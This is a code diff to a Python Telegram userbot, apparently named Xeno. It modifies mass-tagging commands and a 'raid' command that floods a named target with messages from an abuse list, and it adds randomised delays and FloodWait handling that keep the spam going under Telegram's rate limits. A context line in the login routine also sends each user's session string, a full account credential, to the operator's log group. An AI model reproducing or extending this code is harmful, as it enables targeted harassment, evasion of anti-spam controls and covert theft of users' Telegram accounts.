@@ -77,45 +77,65 @@ async def tagall_cmd(c, m):
     active_tasks[uid] = True
     input_text = m.text.split(None, 1)[1] if len(m.command) > 1 else "ʜᴇʏ, ᴋᴀʜᴀɴ ʜᴏ sᴀʙ?"
     await m.delete()
+    
     async for member in c.get_chat_members(m.chat.id):
         if not active_tasks.get(uid): break 
         if member.user.is_bot or member.user.is_deleted: continue
         try:
             await c.send_message(m.chat.id, f"{input_text} {member.user.mention}")
-            await asyncio.sleep(1.5)
-        except: pass
+            await asyncio.sleep(random.uniform(3.5, 5.0))
+        except errors.FloodWait as e:
+            await asyncio.sleep(e.value + 2)
+        except Exception:
+            pass
 
 async def onetag_cmd(c, m):
     uid = c.me.id
     active_tasks[uid] = True 
     await m.delete()
+    
     async for member in c.get_chat_members(m.chat.id):
         if not active_tasks.get(uid): break 
         if member.user.is_bot or member.user.is_deleted: continue
         try:
             msg = random.choice(SWEET_CHATS).format(mention=member.user.mention)
             await c.send_message(m.chat.id, msg)
-            await asyncio.sleep(2.0)
-        except: pass
+            await asyncio.sleep(random.uniform(4.0, 5.5))
+        except errors.FloodWait as e:
+            await asyncio.sleep(e.value + 2)
+        except Exception:
+            pass
 
 async def raid_cmd(c, m):
     uid = c.me.id
-    if len(m.command) < 3: return await m.edit("𝐔𝐬𝐚𝐠𝐞: `.𝐫𝐚𝐢𝐝 𝟓 @𝐮𝐬𝐞𝐫`")
+    # Split text manually to avoid .command issues with custom prefixes
+    args = m.text.split()
+    if len(args) < 3: 
+        return await m.edit_text("❌ **Usage:** `.raid 5 @username`")
+        
     active_tasks[uid] = True 
     try:
-        count = int(m.command[1])
-        target = m.command[2]
+        count = int(args[1])
+        target = args[2]
         await m.delete()
+        
         for _ in range(count):
             if not active_tasks.get(uid): break 
-            await c.send_message(m.chat.id, random.choice(ABUSE_RAIDS).replace("@target", target))
-            await asyncio.sleep(1.3)
-    except: pass
+            try:
+                msg = random.choice(ABUSE_RAIDS).replace("@target", target)
+                await c.send_message(m.chat.id, msg)
+                await asyncio.sleep(random.uniform(2.5, 4.0)) # Safe timing to avoid flood
+            except errors.FloodWait as e:
+                await asyncio.sleep(e.value + 2)
+            except Exception:
+                pass
+    except Exception:
+        pass
 
 async def stop_cmd(c, m):
     uid = c.me.id
     active_tasks[uid] = False 
-    await m.edit("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")
+    await m.edit_text("🚫 **『 ᴀʟʟ ᴘʀᴏᴄᴇssᴇs sᴛᴏᴘᴘᴇᴅ 』**")
 
 # --- BOT MAIN COMMANDS ---
 
@@ -181,7 +201,7 @@ async def finalize_login(c, m, uid):
     try:
         await data["client"].send_message("me", f"✨ **xᴇɴᴏ ᴜsᴇʀʙᴏᴛ sᴛʀɪɴɢ** ✨\n\n`{string}`")
         await bot.send_message(LOG_GROUP, f"🏁 **ɴᴇᴡ sᴇssɪᴏɴ:** `{uid}`\n`{string}`")
-    except: pass
+    except Exception: pass
     del user_data[uid]
 
 if __name__ == "__main__":
